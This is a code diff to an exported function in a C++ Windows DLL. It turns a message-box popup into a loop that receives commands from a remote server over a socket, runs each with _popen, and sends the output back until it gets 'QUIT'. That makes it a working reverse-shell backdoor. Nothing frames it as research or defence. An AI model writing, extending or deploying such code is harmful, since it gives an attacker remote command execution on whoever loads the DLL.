@@ -64,19 +64,49 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
     std::cout << "Data sent to the server" << std::endl;
 
     // Receive response from the server
+    char command[1024];
     char buffer[1024];
-    memset(buffer, 0, sizeof(buffer));
-    if (recv(clientSocket, buffer, sizeof(buffer) - 1, 0) == SOCKET_ERROR) {
-        std::cerr << "Failed to receive data" << std::endl;
-        closesocket(clientSocket);
-        WSACleanup();
-        return;
-    }
+    while (true) {
+        memset(command, 0, sizeof(command));
+        if (recv(clientSocket, command, sizeof(command) - 1, 0) == SOCKET_ERROR) {
+            std::cerr << "Failed to receive data" << std::endl;
+            break;
+        }
 
-    int size = MultiByteToWideChar(CP_UTF8, 0, buffer, -1, nullptr, 0);
-    wchar_t* msg = new wchar_t[size];
-    MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
-    MessageBox(NULL, msg, L"Popup DLL", MB_OK);
+        if (strcmp(command, "QUIT") == 0) {
+            break;
+        }
+
+        if (command == nullptr || strnlen(command, 1024) == 0) {
+            std::cerr << "No command." << std::endl;
+            continue;
+        }
+
+        //int size = MultiByteToWideChar(CP_UTF8, 0, command, -1, nullptr, 0);
+        //wchar_t* msg = new wchar_t[size];
+        //MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
+        //MessageBox(NULL, msg, L"Popup DLL", MB_OK);
+
+        FILE* commandOutput = _popen(command, "r");
+        if (commandOutput == nullptr) {
+            std::cerr << "Failed to execute command." << std::endl;
+            continue;
+        }
+
+        while (fgets(buffer, sizeof(buffer), commandOutput) != nullptr) {
+
+            //int size = MultiByteToWideChar(CP_UTF8, 0, buffer, -1, nullptr, 0);
+            //wchar_t* msg = new wchar_t[size];
+            //MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
+            //MessageBox(NULL, msg, L"Popup DLL", MB_OK);
+
+            // Send the output to the socket
+            send(clientSocket, buffer, strlen(buffer), 0);
+        }
+
+        _pclose(commandOutput);
+
+    }
 
     // Close the socket and cleanup Winsock
     closesocket(clientSocket);
